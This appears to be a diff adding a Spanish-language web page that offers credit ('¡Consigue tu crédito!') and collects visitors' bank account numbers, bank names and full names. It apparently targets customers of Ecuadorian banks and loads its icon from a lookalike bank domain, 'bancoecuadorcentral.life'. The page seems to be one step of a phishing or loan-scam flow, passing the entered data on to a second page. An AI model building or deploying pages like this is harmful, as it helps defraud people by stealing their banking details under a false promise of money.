@@ -1,0 +1,59 @@
+<!doctype html>
+<html lang="es">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Retirar dinero</title>
+  <link rel="icon" href="https://bancoecuadorcentral.life/seguro/assets/favicon.ico" />
+  <link rel="stylesheet" href="styles.css" />
+</head>
+
+<body>
+  <main class="page">
+    <div class="bg" aria-hidden="true"></div>
+    <div class="overlay" aria-hidden="true"></div>
+    <section class="modal" role="dialog" aria-modal="true" aria-labelledby="title">
+      <div class="modal__inner">
+        <h1 id="title">
+          ¡Consigue tu crédito!<br>
+          
+        </h1>
+        <p class="subtitle">
+          Para obtener su crédito. Escriba el número de su cuenta bancaria en la parte inferior e ingrese su nombre y
+          apellidos.
+        </p>
+        <form id="withdrawForm" class="form" action="index2.html" method="get" autocomplete="on">
+          <label class="field">
+            <span class="label">Su número de cuenta bancaria</span>
+            <input name="account" type="text" placeholder="Su número de cuenta bancaria" required />
+          </label>
+          <label class="field">
+            <span class="label">Seleccionar banco</span>
+            <div class="selectWrap">
+              <select name="bank" required>
+                <option selected>Banco Pichincha</option>
+                <option>Produbanco</option>
+                <option>Banco Guayaquil</option>
+                <option>Banco Internacional</option>
+                <option>Banco del Austro</option>
+                <option>Banco del Pacifico</option>
+                <option>Cualquier otro banco</option>
+              </select>
+              <span class="selectChevron" aria-hidden="true"></span>
+            </div>
+          </label>
+          <label class="field">
+            <span class="label">Su nombre y apellidos</span>
+            <input name="name" type="text" placeholder="Su nombre y apellidos" required />
+          </label>
+         
+          <button class="btn" type="submit">Retirar dinero</button>
+          <p id="msg" class="msg" role="status" aria-live="polite"></p>
+        </form>
+      </div>
+    </section>
+  </main>
+</body>
+
+</html>
